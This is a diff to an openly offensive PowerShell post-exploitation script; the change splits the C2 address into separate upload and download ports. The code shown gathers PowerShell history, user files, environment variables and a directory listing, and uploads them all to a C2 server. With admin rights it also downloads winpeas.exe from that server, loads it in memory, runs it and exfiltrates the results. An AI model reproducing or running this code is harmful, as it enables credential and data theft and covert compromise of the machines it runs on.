@@ -99,8 +99,16 @@ function Invoke-Callback {
 function Invoke-Collection {
     param(
         [Parameter(Mandatory=$true)]
-        [string]$C2
+        [string]$C2,
+        
+        [int]$Uport = 8080,
+        [int]$Dport = 80
     )
+    
+    # Construct C2 URLs
+    $UploadC2 = "$C2`:$Uport"
+    $DownloadC2 = "$C2`:$Dport"
+    
     # ----------------------------------------
     # Collect and exfiltrate PowerShell history
     # ----------------------------------------
@@ -118,7 +126,7 @@ function Invoke-Collection {
         try {
             $psHist = Get-Content -Path $histPath -ErrorAction SilentlyContinue | Out-String
             if ($psHist) {
-                Invoke-FileUpload -C2 $C2 -InputString $psHist -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_ConsoleHost_history.txt" | Out-Null
+                Invoke-FileUpload -C2 $UploadC2 -InputString $psHist -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_ConsoleHost_history.txt" | Out-Null
             }
         } catch { }
     }
@@ -131,7 +139,7 @@ function Invoke-Collection {
         $files = Get-ChildItem -Path "C:\Users\" -Include $extensions -File -Recurse -ErrorAction SilentlyContinue
         foreach ($file in $files) {
             try {
-                Invoke-FileUpload -C2 $C2 -FilePath $file | Out-Null
+                Invoke-FileUpload -C2 $UploadC2 -FilePath $file | Out-Null
             } catch {
                 Write-Host "Upload failed for: $($file.FullName)" -ForegroundColor Red
             }
@@ -145,7 +153,7 @@ function Invoke-Collection {
     # ----------------------------------------
     try {
         $envVar = ls env: | Out-String
-        Invoke-FileUpload -C2 $C2 -InputString $envVar -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_Env_vars.txt" | Out-Null
+        Invoke-FileUpload -C2 $UploadC2 -InputString $envVar -FileName "$($env:COMPUTERNAME)_$($env:USERNAME)_Env_vars.txt" | Out-Null
     } catch {
         Write-Host "Error while enumerating environment: $_" -ForegroundColor Yellow
     }
@@ -155,7 +163,7 @@ function Invoke-Collection {
     # ----------------------------------------
     try {
         $root = ls / | Out-String
-        Invoke-FileUpload -C2 $C2 -InputString $root -FileName "$($env:COMPUTERNAME)_Root.txt" | Out-Null
+        Invoke-FileUpload -C2 $UploadC2 -InputString $root -FileName "$($env:COMPUTERNAME)_Root.txt" | Out-Null
     } catch {
         Write-Host "Error while enumerating root: $_" -ForegroundColor Yellow
     }
@@ -167,7 +175,7 @@ function Invoke-Collection {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($identity)
     if ($principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-        $peasUrl = "http://$C2/winpeas.exe"
+        $peasUrl = "http://$DownloadC2/winpeas.exe"
         $wp = [System.Reflection.Assembly]::Load(
             [byte[]](Invoke-WebRequest $peasUrl -UseBasicParsing | Select-Object -ExpandProperty Content)
         )
@@ -185,7 +193,7 @@ function Invoke-Collection {
         # Restore console output
         [Console]::SetOut([System.IO.StreamWriter]::new([Console]::OpenStandardOutput()))
 
-        Invoke-FileUpload -C2 $C2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeasPostexp.txt" | Out-Null
+        Invoke-FileUpload -C2 $UploadC2 -InputString $peasOutput -Filename "$($env:COMPUTERNAME)_$($env:USERNAME)_winpeasPostexp.txt" | Out-Null
     }
 }
 
